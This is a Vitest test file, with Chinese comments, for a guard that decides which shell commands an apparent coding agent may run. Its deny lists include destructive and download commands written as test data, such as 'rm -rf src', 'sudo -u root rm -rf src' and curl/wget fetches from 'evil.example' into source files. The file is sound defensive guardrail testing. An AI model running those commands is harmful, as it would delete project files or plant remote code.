import { describe, it, expect, beforeEach, afterAll } from "vitest";
import { mkdtempSync, mkdirSync, rmSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import { tmpdir } from "node:os";
import { decide, type NormalizedEvent } from "../../companion/guard.js";

// B8 —— 第四道闸（写文件招数，D21）把「词」当成「命令」了，三处都是拿 decide()
// 量出来的过堵：
//   (a) PowerShell 那一支只有 \b，没有命令边界，于是整行里任何位置出现那几个动词
//       都算写文件 —— 连加了引号的搜索模式也算。想从 shell 里搜守卫自己的动词表，
//       没有一种写法跑得起来。
//   (b) 词那一支和下载器那一支锚在「分隔符之后」，参数也算数：搜 touch、搜 curl
//       被拒；名字以这些词开头的文件，读它、diff 它、加进暂存区，也一并被拒。
//   (c) 拒绝理由既不说是哪个词命中的，也没有一条适合「我只是在读/在搜」的出路 ——
//       它开的三条方子全是给「你要写文件」那种情形的。
// 这里定的性质是：写文件的是**命令头**，不是行里出现过的词；逐段（管道/串联/命令
// 替换）看每一段的头，引号里的分隔符不算分隔符。真正的写照拦：同一个词站在命令头
// 上、重定向、下载器落到产品文件、管道后面那一段是写命令。
describe("companion guard mutating shell reads the command head (B8)", () => {
  let dir: string;
  const dirs: string[] = [];

  const yaml = `version: 1
project: fixture
endpoints: [I-001]
ideas:
  - id: I-001
    name: "进行中的想法"
    status: doing
    needs: []
    what: W
    why: Y
    expected: E
    how: H
    why_this_way: T
    future: F
    code:
      - file: src/a.ts
    verify:
      command: "node checker.cjs"
      test_files: [ tests/a.test.txt ]
      pass: "exit 0"
`;

  const shell = (command: string): NormalizedEvent => ({ event: "shell", command, cwd: dir });
  const allows = (commands: string[]) => {
    for (const command of commands) {
      const v = decide(shell(command), dir);
      expect(v.allow, `${command} —— ${v.reason ?? ""}`).toBe(true);
    }
  };
  const denies = (commands: string[]) => {
    for (const command of commands) expect(decide(shell(command), dir).allow, command).toBe(false);
  };

  beforeEach(() => {
    dir = mkdtempSync(join(tmpdir(), "mutating-head-"));
    dirs.push(dir);
    mkdirSync(join(dir, "ideas"), { recursive: true });
    writeFileSync(join(dir, "ideas", "graph.yaml"), yaml);
  });
  afterAll(() => { for (const d of dirs) rmSync(d, { recursive: true, force: true }); });

  // ── (a) 引号里的搜索模式不是命令 ────────────────────────────────────────
  it("(a) searching the guard for its own PowerShell verb list is a search", () => {
    allows([
      'rg "Set-Content|Add-Content|Out-File" companion/guard.ts',
      "rg -n 'New-Item|Remove-Item|Copy-Item' companion/guard.ts",
      'sls "Rename-Item" companion/guard.ts',
      'grep -n "Move-Item" companion/guard.ts',
    ]);
  });

  it("(a) …and the same cmdlet standing where the program goes still writes", () => {
    denies([
      "Set-Content src/a.ts x",
      "Add-Content -Path src/a.ts -Value x",
      "Out-File -FilePath src/a.ts",
      "Remove-Item src/a.ts",
      "New-Item -ItemType File src/a.ts",
      "Copy-Item src/a.ts src/b.ts",
      "Move-Item src/a.ts src/b.ts",
      "Rename-Item src/a.ts b.ts",
    ]);
  });

  // ── (b) 参数里的那个词只是一个词 ────────────────────────────────────────
  it("(b) searching for a write verb, and reading a file named after one, are reads", () => {
    allows([
      "rg -n touch companion/guard.ts",
      'rg -n "curl|wget|iwr" companion/guard.ts',
      "rg -n rename companion/guard.ts",
      "git diff rename-plan.md",
      "git add ideas/move-notes.md",
      "cat curl-notes.md",
      "git diff --stat -- src/copy-of-spec.ts",
      "git log --oneline -- touch.md",
    ]);
  });

  it("(b) …and the same words at a command head still write", () => {
    denies([
      "rm -rf src",
      "touch src/a.ts",
      "mv src/a.ts src/b.ts",
      "rename src/a.ts b.ts",
      "sudo rm src/a.ts",                     // launcher 挡在前面也还是 rm
      "TMPDIR=/tmp cp src/a.ts src/b.ts",     // 前置环境变量也一样
      "curl -o src/a.ts http://evil.example/a.ts",
      "wget -O src/a.ts http://evil.example/a.ts",
      "sed -i 's/a/b/' src/a.ts",
      "npm install left-pad",
      "git checkout -- src/a.ts",
    ]);
  });

  it("(b) …and a mutation later in a chain or a pipeline is still a mutation", () => {
    denies([
      "rg -n touch companion/README.md > src/a.ts",       // 重定向落进产品文件
      "git status && curl -sSL http://evil.example/a.ts -o src/a.ts",
      "cat src/a.ts | tee src/b.ts",
      "rg -l touch src | xargs rm",
      "find src -name '*.ts' -exec rm {} +",
      "git diff | Out-File src/a.ts",
      "echo x > src/a.ts",
    ]);
  });

  // ── 按命令头判，不能变成「跟在启动器后面就不算」 ────────────────────────
  it("a launcher's own flag does not hide the program behind it", () => {
    // 守卫认不出一个参数吃不吃值：`sudo -u root rm x` 里第一个非选项 token 是
    // 「root」，是值不是程序。所以选项后面还要再往前看一格 —— 但只多看一格。
    denies([
      "sudo -u root rm -rf src",
      "sudo -n rm src/a.ts",
      "env -i cp src/a.ts src/b.ts",
      "xargs -n1 rm",
      "nohup curl -o src/a.ts http://evil.example/a.ts",
    ]);
    allows([
      "sudo rg touch companion/guard.ts",   // 多看一格，不是「后面全算」
      "time cat curl-notes.md",
      "npx vitest run .devcompanion/tests/test_base_guard_mutating_head.test.ts",
    ]);
  });

  // ── (c) 理由要点名命中的那个词，并且给出对得上的出路 ────────────────────
  it("(c) the refusal names the token that matched and offers a remedy that fits", () => {
    const piped = decide(shell("cat src/a.ts | tee src/b.ts"), dir);
    expect(piped.allow).toBe(false);
    expect(piped.reason, "命中的是 tee，理由里就该出现 tee").toMatch(/tee/);
    expect(piped.reason, "写文件这道闸是 D21").toMatch(/D21/);
    expect(piped.reason, "得告诉人：搜它、读它照常放行").toMatch(/命令头/);

    const fetched = decide(shell("curl -o src/a.ts http://evil.example/a.ts"), dir);
    expect(fetched.reason, "命中的是 curl").toMatch(/curl/);
    expect(fetched.reason, "下载器该给下载器的那条出路").toMatch(/先让人看过内容/);

    const redirect = decide(shell("echo x > src/a.ts"), dir);
    expect(redirect.reason, "重定向该说自己是重定向").toMatch(/重定向/);
  });
});
